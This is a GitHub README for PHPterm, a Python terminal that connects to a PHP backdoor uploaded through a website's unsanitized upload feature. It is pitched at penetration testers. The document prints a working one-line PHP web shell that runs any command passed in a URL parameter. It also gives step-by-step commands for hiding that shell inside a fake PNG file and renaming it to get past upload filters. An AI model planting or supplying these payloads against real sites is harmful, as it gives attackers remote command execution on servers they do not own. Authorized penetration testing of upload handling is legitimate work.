<h1 align="center" id="title">PHPterm</h1>

<p align="center"><img src="https://socialify.git.ci/PowerCmptr/PHPterm/image?language=1&amp;name=1&amp;owner=1&amp;pattern=Circuit+Board&amp;theme=Dark" alt="project-image"></p>

<p id="description">A terminal for penetration testers to connect to an uploaded php payload. (Made with Python). The payload itself is one simple PHP code line to give the tester access to a remote reverse shell through unsanitized uplaod features of a website.</p>

<h2>Project Screenshots:</h2>

<img src="https://github.com/PowerCmptr/PHP-Term/blob/main/screenshots/ss1.png?raw=true" alt="project-screenshot" width="1115" height="625/">

<img src="https://github.com/PowerCmptr/PHP-Term/blob/main/screenshots/ss2.png?raw=true" alt="project-screenshot" width="1115" height="625/">

  <br>
  
<h2>🧐 Features</h2>

Here're some of the project's best features:

*   Easy access to PHP backdoors
*   Auto-fetching the file system
*   Auto command completion
*   Colored output for readability
*   Auto-fetching the user using whoami command
<br>
<h2>🛠️ Installation Steps:</h2>

<p>1. Make the file executable</p>

```
chmod +x PHPterm_1.1
```

<p>2. Execute the program</p>

```
./PHPterm_1.1_Linux64
```

  <br>
  
<h2>💻 Built with</h2>

Technologies used in the project:

*   PHP
*   Python

<br>

<h2>📄 Documentation</h2>
<p>It works by sending http requests to an uploaded php payload, which looks like this:</p>
```
<?php echo shell_exec($_GET['cmd']); ?>
```

<br>
<p> In theory you could just use the URL bar as a command line by adding "?cmd=" + the desired shell command, but that would be a less enjoyable experience and the output wouldn't be really organized.

In order to test sanitization and isolation to its fullest, you can create a disguised payload. 
As an example: <br>
<br>
Create an empty PNG formatted file: <br>
```
printf "\x89PNG\r\n\x1a\n" > payload.png
```
<br>

Append PHP-Payload:
```
echo "<?php system(\$_GET['cmd']); ?>" >> payload.png
```
<br>
Give it a PHP alias: <br>

```
mv payload.png payload.png.php
```
<br>
This will also work with different file formats and might help you to sanitize the uploads properly.
</p>
